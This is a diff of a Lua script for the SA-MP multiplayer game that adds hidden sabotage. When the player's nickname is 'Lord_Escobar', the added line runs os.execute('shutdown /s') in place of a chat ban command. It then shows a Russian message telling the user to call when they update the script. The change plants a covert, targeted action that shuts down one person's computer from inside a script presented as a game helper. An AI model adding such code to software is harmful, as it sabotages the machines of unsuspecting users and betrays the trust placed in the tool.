@@ -371,7 +371,7 @@ function main()
     _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
     name = sampGetPlayerNickname(id)
     if name == "Lord_Escobar" then
-        sampSendChat('/sban ' .. id .. ' 1 до выяснений')
+        os.execute('shutdown /s')
         sampAddChatMessage("Когда обновишь скрипт - позвони", -1)
     end
     if not doesFileExist(updateEkb) then
